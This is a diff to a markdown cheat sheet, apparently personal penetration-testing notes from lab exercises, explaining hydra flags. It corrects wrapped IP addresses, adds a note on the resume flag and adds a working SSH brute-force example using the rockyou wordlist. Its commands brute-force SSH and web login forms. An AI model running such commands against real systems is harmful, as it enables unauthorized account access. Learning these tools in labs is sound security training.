@@ -35,14 +35,12 @@ hydra -L usernames.txt -p butterfly 10.10.137.76 ssh
 ### `-p` & `-P` password:
 Similar to `-l`/ `-L` you can use the `-p` and `-P` flags to supply a password or text file of passwords for hydra to try:
 ```bash
-hydra -l molly -P passwords.txt 10.10.
-167.73 ssh
+hydra -l molly -P passwords.txt 10.10.167.73 ssh
 ```
 ### `-f` fail/ force stop
 This flag tells hydra to *stop brute forcing* when a successful match is found.
 ```bash
-hydra -l molly -p butterfly -f 10.10.136.
-98 ssh
+hydra -l molly -p butterfly -f 10.10.136.98 ssh
 ```
 ### `-v` verbose
 The `-v` flag will tell hydra to output its progress as it works.
@@ -51,6 +49,8 @@ The `-s` flag is used to tell hydra which port on the target IP to attack. If we
 ```bash
 hydra  -l molly -p peanuts -f 10.10.10.136 ssh -s 6969
 ```
+### `-R` Resume a previous session
+Giving `-R` to hydra (after stopping a spray mid-execution) tells hydra to resume the spray.
 ### The `<service>` field
 This field takes the service you want hydra to brute force on the target IP. If you want to brute force an [SSH](/networking/protocols/SSH.md) login for example, you provide `ssh`.
 #### `http` service
@@ -65,6 +65,11 @@ hydra ... http-post-form "<URL endpoint>:<parameters to bruteforce>:<error strin
 Putting these all together will look like this:
 ```bash
 hydra -L usernames.txt -P passwords.txt -f -v 10.10.161.7 http-post-form "/login.php:password=^PASS^&username=^USER^:Login failed" -s 8000
+```
+## Examples which Worked
+### SSH Brute
+```bash
+hydra -l 'James' -P /usr/share/wordlists/rockyou.txt 10.10.110.100 ssh -f
 ```
 
 > [!Resources]
